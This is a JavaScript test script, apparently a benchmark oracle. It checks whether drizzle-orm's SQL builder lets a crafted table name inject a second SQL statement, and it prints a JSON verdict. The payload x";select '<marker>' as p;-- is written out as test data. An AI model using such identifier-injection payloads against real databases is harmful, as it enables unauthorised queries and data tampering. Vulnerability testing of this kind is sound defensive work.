let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

function finish() {
  console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
}

try {
  const orm = require('drizzle-orm');
  const sqlite = require('drizzle-orm/sqlite-core');

  if (!orm || typeof orm.sql !== 'function') throw new Error('missing_sql');
  if (!sqlite || typeof sqlite.sqliteTable !== 'function' || typeof sqlite.text !== 'function') {
    throw new Error('missing_sqlite_core');
  }

  const { sql } = orm;
  const { sqliteTable, text } = sqlite;

  const cfg = {
    escapeName: (n) => `"${String(n).replace(/"/g, '""')}"`,
    escapeParam: () => '?',
    escapeString: (s) => `'${String(s).replace(/'/g, "''")}'`,
    casing: { getColumnCasing: (c) => c.name },
    paramStartIndex: { value: 0 },
    inlineParams: false,
  };

  const benignTable = sqliteTable('users', { id: text('id') });
  const benignQuery = sql`select ${benignTable.id} from ${benignTable}`;
  const benignSql = String((benignQuery.toQuery(cfg) || {}).sql || '');
  if (!/select\s+"users"\."id"\s+from\s+"users"/i.test(benignSql)) {
    throw new Error('benign_sql_unexpected:' + benignSql);
  }

  operation_completed = true;

  const marker = 'drizzle_ident_marker_f2a4d9';
  const payload = `x";select '${marker}' as p;--`;
  const evilTable = sqliteTable(payload, { c: text('c') });
  const malQuery = sql`select ${evilTable.c} from ${evilTable}`;
  const malSql = String((malQuery.toQuery(cfg) || {}).sql || '');

  const hasSecondStatementPattern = /;\s*select\s+'drizzle_ident_marker_f2a4d9'\s+as\s+p\s*;?/i.test(malSql);
  const semicolonCount = (malSql.match(/;/g) || []).length;

  exploit_succeeded = hasSecondStatementPattern && semicolonCount >= 2;
  evidence = JSON.stringify({ benignSql, malSql, hasSecondStatementPattern, semicolonCount });
} catch (e) {
  const msg = e && e.message ? e.message : String(e);
  if (!operation_completed) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'setup_or_benign_error:' + msg;
  } else {
    exploit_succeeded = false;
    evidence = 'malicious_blocked_or_error:' + msg;
  }
}

finish();